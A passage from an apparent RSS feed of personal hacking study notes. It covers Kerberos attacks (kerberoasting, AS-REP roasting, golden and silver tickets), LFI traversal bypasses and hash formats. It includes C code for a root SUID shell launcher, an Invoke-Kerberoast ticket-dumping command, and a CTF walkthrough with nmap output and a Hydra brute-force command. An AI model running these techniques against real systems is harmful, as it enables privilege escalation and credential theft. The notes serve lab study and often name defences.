key.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;(3) Once the client receives messages A and B, it attempts to decrypt message A with the NT hash generated from the password entered by the user. If the user entered password does not match the password in the authentication service database then decryption of message A will fail. Once message A is decrypted, the client obtains the &lt;em&gt;Client/TGS Session Key&lt;/em&gt;. This session key is used for further communications with the ticket granting service. (Note: The client cannot decrypt Message B, as it is encrypted using the KDC long term secret key.)&lt;/p&gt;&lt;h3 id=&quot;client-service-authorization&quot;&gt;Client Service Authorization&lt;/h3&gt;&lt;p&gt;(1) TGS-REQ: When requesting services, the client sends the following messages to the ticket granting service:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Message C: Composed of the ticket granting ticket and the service principal name of the requested service.&lt;/li&gt;&lt;li&gt;Message D: Authenticator (which is composed of the client ID and the timestamp), encrypted using the &lt;em&gt;Client/TGS Session Key&lt;/em&gt;.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;(2) TGS-REP: Upon receiving messages C and D, the ticket granting service retrieves the ticket granting ticket out of message C and decrypts it using the KDC long term secret key. This gives it the &lt;em&gt;Client/TGS Session Key&lt;/em&gt; and the client ID (the client ID is part of the privilege attribute certificate). Using the &lt;em&gt;Client/TGS Session Key&lt;/em&gt;, the ticket granting service decrypts message D (Authenticator) and compares the client IDs from the ticket granting ticket and message D; if they match, the server sends the following two messages to the client:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Message E: &lt;em&gt;Service ticket&lt;/em&gt; (which includes the privilege attribute certificate, client network address, validity period, and &lt;em&gt;Client/Server Session Key&lt;/em&gt;) encrypted using the service's long term secret key.&lt;/li&gt;&lt;li&gt;Message F: &lt;em&gt;Client/Server Session Key&lt;/em&gt; encrypted with the &lt;em&gt;Client/TGS Session Key&lt;/em&gt;.&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;client-service-access&quot;&gt;Client Service Access&lt;/h3&gt;&lt;p&gt;(1) AP-REQ: Upon receiving messages E and F from ticket granting service, the client has enough information to authenticate itself to the service server. The client connects to the service server and sends the following two messages:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Message E: The &lt;em&gt;service ticket&lt;/em&gt; (as provided by the ticket granting service; see above).&lt;/li&gt;&lt;li&gt;Message G: A new Authenticator, which includes the client ID, timestamp and is encrypted using &lt;em&gt;Client/Server Session Key&lt;/em&gt;.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;(2) AP-REP: The service server decrypts the service ticket (message E) using its long term secret key to retrieve the &lt;em&gt;Client/Server Session Key&lt;/em&gt;. Using the sessions key, it then decrypts the Authenticator and compares client ID from the service ticket and message G. If they match the server sends the following message to the client to confirm its true identity and willingness to serve the client:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Message H: The timestamp found in client's Authenticator (sometimes modified, depending upon the version of Kerberos being used), encrypted using the &lt;em&gt;Client/Server Session Key&lt;/em&gt;.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;(3) The client decrypts the confirmation (message H) using the &lt;em&gt;Client/Server Session Key&lt;/em&gt; and checks whether the timestamp is correct. If so, then the client can trust the server and can start issuing service requests to the server.&lt;/p&gt;&lt;p&gt;(4) The server provides the requested services to the client.&lt;/p&gt;&lt;h2 id=&quot;kirbi-files&quot;&gt;.kirbi Files&lt;/h2&gt;&lt;p&gt;There's a bit of terminology creep when discussing Kerberos tickets. Mimikatz and Rubeus are actually dumping Kerberos data structures (as .kirbi files), which contain &lt;em&gt;both&lt;/em&gt; a ticket &lt;em&gt;and&lt;/em&gt; the corresponding session key. People tend to call these .kirbi files &quot;tickets&quot;, but it's worth keeping in mind that they contain &lt;em&gt;both&lt;/em&gt; pieces of data (as a &quot;ticket&quot; in the Kerberos sense, not the hacker's sense, isn't useful without the corresponding session key).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;http://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/&quot;&gt;Rubeus - Now With More Kekeo&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Mimikatz.md&quot;&gt;Using Mimikatz&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Rubeus.md&quot;&gt;Using Rubeus&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;atacking-kerberos&quot;&gt;Atacking Kerberos&lt;/h2&gt;&lt;h3 id=&quot;kerberoasting&quot;&gt;Kerberoasting&lt;/h3&gt;&lt;p&gt;Kerberoasting is where a service ticket is used to brute force a service password. This password can then be used to either move laterally or (if the service runs with elevated privileges) to elevate your privileges.&lt;/p&gt;&lt;p&gt;Note that not every account is kerberoastable, though it's not 100% obvious from this walk-through why that is. The Kali Linux tool &lt;code&gt;bloodhound&lt;/code&gt; can be used to identify potentially kerberoastable accounts.&lt;/p&gt;&lt;p&gt;The &lt;code&gt;Invoke-Kerberoast&lt;/code&gt; PowerShell module can be used to create a dump of service tickets that can then be attacked offline using Hashcat of John the Ripper. (Note that calling &lt;code&gt;Out-File&lt;/code&gt; with the &lt;code&gt;-Width 8000&lt;/code&gt; option is important in the below example, as otherwise the ticket can be truncated!)&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;Invoke-Kerberoast -OutputFormat Hashcat |&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;Select-Object&lt;/span&gt; Hash |&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;Out-File&lt;/span&gt; -filepath &lt;span class=&quot;st&quot;&gt;&amp;quot;$FILE_PATH&amp;quot;&lt;/span&gt; -Width 8000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The main defenses against kerberoasting are (1) strong passwords and (2) making sure you're not running any services as domain admin (which you shouldn't need to do in this day and age anyway).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1&quot;&gt;EmpireProject / Empire / module_source / credentials / Invoke-Kerberoast.ps1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Hashcat.md&quot;&gt;Using Hashcat&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20John%20the%20Ripper.md&quot;&gt;Using John the Ripper&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;as-rep-roasting&quot;&gt;AS-REP Roasting&lt;/h3&gt;&lt;p&gt;AES-REP roasting is basically kerberoasting for regular user accounts. The only requirement to roast a user account is that Kerberos pre-authentication is disable.&lt;/p&gt;&lt;p&gt;(When pre-authentication is disabled, the authentication server will supply a ticket granting ticket and a session key automatically when requested, &lt;em&gt;without first verifying the user&lt;/em&gt;. This data is then stored offline by the Windows machine for later decryption when the user with pre-authentication disabled logs in. But this means that all we need to do is to break the user's NT hash!)&lt;/p&gt;&lt;p&gt;Basically the only mitigation for this attack is to keep pre-authentication enabled, though strong password policies can help.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Windows%20Password%20Hashes.md&quot;&gt;Windows Password Hashes&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;pass-the-ticket-attacks&quot;&gt;Pass the Ticket Attacks&lt;/h3&gt;&lt;p&gt;The only real way to defend against this attack is to &lt;em&gt;only&lt;/em&gt; allow domain admins to log into domain controllers, &lt;em&gt;not&lt;/em&gt; lower privileged machines!&lt;/p&gt;&lt;h2 id=&quot;goldensilver-ticket-attacks&quot;&gt;Golden/Silver Ticket Attacks&lt;/h2&gt;&lt;p&gt;The idea with gold and silver tickets is that, since the KDC and service long term secret keys are just the NT hashes of the corresponding service account's passwords, then if you can dump the password (or even its hash), you can &lt;em&gt;forge&lt;/em&gt; a kerberos ticket without ever needing to contact the KDC.&lt;/p&gt;&lt;p&gt;Silver tickets are forged using a service account's NT hash, and can be used to grant any user access to that service. This works because Kerberos implicitly assumes that &lt;em&gt;only&lt;/em&gt; the KDC and the service account know the service account's long term secret key.&lt;/p&gt;&lt;p&gt;Golden tickets take things a step further - if you can get the &lt;code&gt;krbtgt&lt;/code&gt; &lt;em&gt;user&lt;/em&gt;'s NT hash, then you can forge a ticket granting ticket for any user, and then use that to get the KDC to provide a valid service ticket for any service that user has access to. This works because Kerberos trusts the encrypted ticket granting ticket blob and &lt;em&gt;doesn't reauthenticate the user before granting further access&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;Golden tickets are powerful (since you can be anyone, it's trivial to gain control of the domain), but also noisier - because you're running through the KDC infrastructure, golden ticket still generate (almost) all of the normal logging, while silver tickets allow you to bypass the KDC completely and only generate logs on the service server (if that).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://blog.quest.com/golden-ticket-attacks-how-they-work-and-how-to-defend-against-them/&quot;&gt;Golden ticket attacks: How they work - and how to defend against them&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://en.hackndo.com/kerberos-silver-golden-tickets/&quot;&gt;Silver &amp;amp; Golden Tickets&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Kerberos.md</guid>
		</item>
		<item>
			<title>LFI (Local File Inclusion) Attacks</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/LFI%20%28Local%20File%20Inclusion%29%20Attacks.md</link>
			<description>&lt;p&gt;LFI vulnerabilities are &lt;em&gt;most&lt;/em&gt; common in PHP, but are sometimes found in other languages/frameworks.&lt;/p&gt;&lt;p&gt;Since web servers are typically serving content from &lt;code&gt;/var/www&lt;/code&gt;, &lt;code&gt;/var/www/srv&lt;/code&gt;, or an immediate subdirectory for virtual hosts, you generally need to use &lt;code&gt;../../&lt;/code&gt;, &lt;code&gt;../../../&lt;/code&gt;, or &lt;code&gt;../../../../&lt;/code&gt; to reach &lt;code&gt;/&lt;/code&gt;.&lt;/p&gt;&lt;h2 id=&quot;php-tricks&quot;&gt;PHP Tricks&lt;/h2&gt;&lt;p&gt;For PHP &amp;lt; 5.3.4, you can use the poison null byte to defeat simple path filters or situations where the developer is appending some suffix to user input.&lt;/p&gt;&lt;p&gt;If the poison null byte doesn't work, another trick relies on the fact that for some bizarre reason PHP allows files to be referenced with &lt;code&gt;.&lt;/code&gt; notation just like directories. In other words, &lt;code&gt;/etc/passwd/.&lt;/code&gt; will return the contents of &lt;code&gt;/etc/passwd&lt;/code&gt;!&lt;/p&gt;&lt;p&gt;Representing &lt;code&gt;../&lt;/code&gt; as &lt;code&gt;....//&lt;/code&gt; can bypass filters that replace &lt;code&gt;../&lt;/code&gt;, as PHP search-and-replace only does a single pass through a string (it should be obvious how to extend this if a developer tries to just run a search and replace &lt;em&gt;twice&lt;/em&gt;).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./The%20Poison%20Null%20Byte.md&quot;&gt;The Poison Null Byte&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/LFI%20%28Local%20File%20Inclusion%29%20Attacks.md</guid>
		</item>
		<item>
			<title>Linux (and BSD) Password Hashes</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Linux%20%28and%20BSD%29%20Password%20Hashes.md</link>
			<description>&lt;p&gt;UNIX-style passwords are of the form &lt;code&gt;$format$rounds$salt$hash&lt;/code&gt;. Common &lt;code&gt;format&lt;/code&gt; parameters:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;1 - md5crypt (mostly older)&lt;/li&gt;&lt;li&gt;2, 2a, 2b, 2x, 2y - bcrypt (generally web apps)&lt;/li&gt;&lt;li&gt;6 - sha512crypt (most modern systems)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Both $rounds and $salt are optional (salts are never purely numeric, so it's easy to tell these apart).&lt;/p&gt;&lt;p&gt;Bcrypt is designed to take approximately the same amount of time when hashed on a CPU vs. a GPU, which is one reason it's considered more resistant to cracking.&lt;/p&gt;&lt;p&gt;NOTE: 1 hex digit = 4 bits (2 hex digits per byte), which is why a 128-bit md5 hash is 32 characters long.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/beginner&quot;&gt;TryHackMe: Complete Beginner&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Linux%20%28and%20BSD%29%20Password%20Hashes.md</guid>
		</item>
		<item>
			<title>Minimal SUID Shell Launcher</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Minimal%20SUID%20Shell%20Launcher.md</link>
			<description>&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode c&quot;&gt;&lt;code class=&quot;sourceCode c&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;main() {&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    setuid(&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    setgid(&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    execl(&lt;span class=&quot;st&quot;&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;,&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;          &lt;span class=&quot;st&quot;&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;,&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;          &lt;span class=&quot;st&quot;&gt;&amp;quot;-p&amp;quot;&lt;/span&gt;,&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;          (&lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt;*) NULL);&lt;/span&gt;
&lt;span id=&quot;cb1-11&quot;&gt;&lt;a href=&quot;#cb1-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Alternate approach:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode c&quot;&gt;&lt;code class=&quot;sourceCode c&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;time.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-4&quot;&gt;&lt;a href=&quot;#cb2-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;main() {&lt;/span&gt;
&lt;span id=&quot;cb2-5&quot;&gt;&lt;a href=&quot;#cb2-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    setresuid(&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb2-6&quot;&gt;&lt;a href=&quot;#cb2-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    setregid(&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb2-7&quot;&gt;&lt;a href=&quot;#cb2-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    system(&lt;span class=&quot;st&quot;&gt;&amp;quot;/bin/bash -p&amp;quot;&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb2-8&quot;&gt;&lt;a href=&quot;#cb2-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;cf&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;
&lt;span id=&quot;cb2-9&quot;&gt;&lt;a href=&quot;#cb2-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once compiled, this needs to be called by an SUID binary. The &lt;code&gt;-p&lt;/code&gt; is required to keep bash from dropping privileges.&lt;/p&gt;&lt;p&gt;Note that this is very similar to the &lt;code&gt;LD_PRELOAD&lt;/code&gt; trick, except that we're using &lt;code&gt;execl()&lt;/code&gt; instead of &lt;code&gt;system()&lt;/code&gt; and dropping a header.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/slyth11907/Cheatsheets&quot;&gt;slyth11907 / Cheatsheets&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/a/34400649&quot;&gt;unistd's execl() without passing any arguments&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Exploiting%20Bash.md&quot;&gt;Exploiting Bash&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Exploiting%20LD_PRELOAD.md&quot;&gt;Exploiting LD_PRELOAD&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.offensive-security.com/offsec/offsec-live/&quot;&gt;OffSec Live&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Minimal%20SUID%20Shell%20Launcher.md</guid>
		</item>
		<item>
			<title>Net Sec Challenge</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Net%20Sec%20Challenge.md</link>
			<description>&lt;p&gt;This CTF is just a series of questions. All should be solvable using nmap, telnet, and Hydraâ¦ Though I'm going to substitute netcat for telnet. However, I'm sticking to the spirit of things, and will only use those three tools.&lt;/p&gt;&lt;p&gt;The target machine is 10.10.152.115.&lt;/p&gt;&lt;p&gt;We'll start off with a full nmap scan:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; nmap -v -oN net-sec-challenge -Pn -A --reason -T4 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;          &lt;span class=&quot;ex&quot;&gt;-p-&lt;/span&gt; 10.10.152.115&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Results:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Sun Apr  3 20:48:04 2022 as: nmap -v -oN net-sec-challenge -Pn -A --reason -T4 -p- 10.10.152.115
Increasing send delay for 10.10.152.115 from 0 to 5 due to 909 out of 2271 dropped probes since last increase.
Increasing send delay for 10.10.152.115 from 5 to 10 due to 11 out of 15 dropped probes since last increase.
Nmap scan report for 10.10.152.115
Host is up, received user-set (0.19s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 61 (protocol 2.0)
| ssh-hostkey: 
|   3072 da:5f:69:e2:11:1f:7c:66:80:89:61:54:e8:7b:16:f3 (RSA)
|   256 3f:8c:09:46:ab:1c:df:d7:35:83:cf:6d:6e:17:7e:1c (ECDSA)
|_  256 ed:a9:3a:aa:4c:6b:16:e6:0d:43:75:46:fb:33:b2:29 (ED25519)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
80/tcp    open  http        syn-ack ttl 61 lighttpd
|_http-server-header: lighttpd THM{web_server_25352}
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Hello, world!
139/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.6.2
445/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.6.2
8080/tcp  open  http        syn-ack ttl 61 Node.js (Express middleware)
|_http-title: Site doesn&amp;#39;t have a title (text/html; charset=utf-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
10021/tcp open  ftp         syn-ack ttl 61 vsftpd 3.0.3
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.92%I=7%D=4/3%Time=624A60E5%P=x86_64-pc-linux-gnu%r(NULL,
SF:29,&amp;quot;SSH-2\.0-OpenSSH_8\.2p1 THM{946219583339}
&amp;quot;);
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=4/3%OT=22%CT=1%CU=32245%PV=Y%DS=4%DC=T%G=Y%TM=624A6111
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11
OS:NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
OS:R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 12.801 days (since Tue Mar 22 01:54:39 2022)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Unix

Host script results:
|_clock-skew: -1s
| nbstat: NetBIOS name: NETSEC-CHALLENG, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| Names:
|   NETSEC-CHALLENG&amp;lt;00&amp;gt;  Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   NETSEC-CHALLENG&amp;lt;03&amp;gt;  Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   NETSEC-CHALLENG&amp;lt;20&amp;gt;  Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   WORKGROUP&amp;lt;00&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
|_  WORKGROUP&amp;lt;1e&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
| smb2-time: 
|   date: 2022-04-04T03:07:53
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   47.27 ms  10.13.0.1
2   ... 3
4   222.58 ms 10.10.152.115

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr  3 21:08:01 2022 -- 1 IP address (1 host up) scanned in 1197.32 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This enables us to answer a set of questions immediately.&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;What is the highest port number being open less than 10,000? - 8080&lt;/p&gt;&lt;p&gt;There is an open port outside the common 1000 ports; it is above 10,000. What is it? - 10021&lt;/p&gt;&lt;p&gt;How many TCP ports are open? - 6&lt;/p&gt;&lt;p&gt;What is the flag hidden in the HTTP server header? - THM{web_server_25352}&lt;/p&gt;&lt;p&gt;What is the flag hidden in the SSH server header? - THM{946219583339}&lt;/p&gt;&lt;p&gt;We have an FTP server listening on a nonstandard port. What is the version of the FTP server? - vsftpd 3.0.3&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;That's all pretty easy. The next one is a bit harder with our limited toolsetâ¦&lt;/p&gt;&lt;p&gt;We start off by attempting to brute force the password for &lt;code&gt;eddie&lt;/code&gt; or &lt;code&gt;quinn&lt;/code&gt; using Hydra. To do this, we're going to run two Hydra tasks in parallel.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Hydra task to break eddie&amp;#39;s password.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;hydra&lt;/span&gt; -v -f -t 10 -s 10021 -l eddie &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
